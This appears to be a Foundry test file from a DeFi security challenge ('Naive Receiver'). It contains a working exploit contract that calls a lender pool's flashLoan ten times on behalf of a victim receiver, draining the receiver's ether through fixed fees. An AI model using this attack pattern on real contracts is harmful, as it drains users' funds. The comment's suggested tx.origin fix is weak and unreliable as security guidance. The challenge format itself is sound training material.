// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {Utilities} from "../../utils/Utilities.sol";
import "forge-std/Test.sol";

import {FlashLoanReceiver} from "../../../src/Contracts/naive-receiver/FlashLoanReceiver.sol";
import {NaiveReceiverLenderPool} from "../../../src/Contracts/naive-receiver/NaiveReceiverLenderPool.sol";

contract Exploit {
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    address internal owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only accessible to owner.");
        _;
    }

    function exploit(
        address flashLoanReceiverAddress,
        address naiveReceiverLenderPoolAddress
    ) public onlyOwner {
        for (uint256 i = 0; i < 10; ++i) {
            INaiveReceiverLenderPool(naiveReceiverLenderPoolAddress).flashLoan(
                flashLoanReceiverAddress,
                0
            );
        }
    }
}

contract NaiveReceiver is Test {
    uint256 internal constant ETHER_IN_POOL = 1_000e18;
    uint256 internal constant ETHER_IN_RECEIVER = 10e18;

    Utilities internal utils;
    NaiveReceiverLenderPool internal naiveReceiverLenderPool;
    FlashLoanReceiver internal flashLoanReceiver;
    address payable internal user;
    address payable internal attacker;

    function setUp() public {
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(2);
        user = users[0];
        attacker = users[1];

        vm.label(user, "User");
        vm.label(attacker, "Attacker");

        naiveReceiverLenderPool = new NaiveReceiverLenderPool();
        vm.label(
            address(naiveReceiverLenderPool),
            "Naive Receiver Lender Pool"
        );
        vm.deal(address(naiveReceiverLenderPool), ETHER_IN_POOL);

        assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL);
        assertEq(naiveReceiverLenderPool.fixedFee(), 1e18);

        flashLoanReceiver = new FlashLoanReceiver(
            payable(naiveReceiverLenderPool)
        );
        vm.label(address(flashLoanReceiver), "Flash Loan Receiver");
        vm.deal(address(flashLoanReceiver), ETHER_IN_RECEIVER);

        assertEq(address(flashLoanReceiver).balance, ETHER_IN_RECEIVER);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // Idea: there's no guard on who can invoke a flash loan to whom, so just make the receiver borrow the flash loan.
        //          I think this could be fixed if the receiver required the tx.origin to be a specific ethereum address.

        // Attacker deploys contract at block N
        vm.startPrank(attacker);
        Exploit exploitContract = new Exploit(); // a contract with the exploit inside of a function; this could be done on block N
        vm.stopPrank();

        // Time goes on, many blocks pass...

        // Attacker invokes attack on contract
        vm.startPrank(attacker);
        exploitContract.exploit(
            address(flashLoanReceiver),
            address(naiveReceiverLenderPool)
        );
        vm.stopPrank();

        /** EXPLOIT END **/
        validation();
        console.log(unicode"🎉 EXPLOIT SUCCESSFUL, NICELY DONE! 🎉");
    }

    function validation() internal {
        // All ETH has been drained from the receiver
        assertEq(address(flashLoanReceiver).balance, 0);
        assertEq(
            address(naiveReceiverLenderPool).balance,
            ETHER_IN_POOL + ETHER_IN_RECEIVER
        );
    }
}

interface INaiveReceiverLenderPool {
    function flashLoan(address borrower, uint256 borrowAmount) external;
}
